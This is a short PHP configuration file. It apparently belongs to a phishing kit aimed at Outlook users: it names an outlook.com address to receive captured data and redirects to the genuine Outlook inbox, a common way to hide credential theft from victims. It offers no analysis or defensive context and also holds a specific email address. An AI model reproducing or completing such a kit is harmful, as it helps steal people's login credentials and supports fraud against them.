<?php 
$Receive_email="neciaannmanchasmd@outlook.com";
$redirect="https://outlook.office.com/mail/inbox";
?>